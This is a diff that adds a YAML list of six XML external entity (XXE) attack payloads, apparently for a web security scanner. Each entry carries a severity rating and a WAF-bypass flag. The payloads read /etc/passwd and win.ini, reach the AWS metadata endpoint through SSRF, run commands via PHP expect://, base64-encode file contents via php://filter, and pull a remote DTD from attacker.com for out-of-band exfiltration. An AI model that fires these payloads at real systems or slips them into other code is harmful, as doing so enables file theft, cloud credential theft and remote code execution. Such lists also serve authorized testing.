@@ -1,0 +1,25 @@
+﻿payloads:
+  - payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>'
+    description: Classic XXE file read - Linux passwd
+    severity: critical
+    bypass_waf: false
+  - payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><r>&xxe;</r>'
+    description: Classic XXE file read - Windows
+    severity: critical
+    bypass_waf: false
+  - payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><r>&xxe;</r>'
+    description: XXE SSRF to AWS metadata
+    severity: critical
+    bypass_waf: false
+  - payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><r>&xxe;</r>'
+    description: PHP expect RCE via XXE
+    severity: critical
+    bypass_waf: false
+  - payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;]><r>&exfil;</r>'
+    description: OOB XXE with remote DTD
+    severity: critical
+    bypass_waf: true
+  - payload: '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><r>&test;</r>'
+    description: XXE via PHP filter
+    severity: high
+    bypass_waf: true
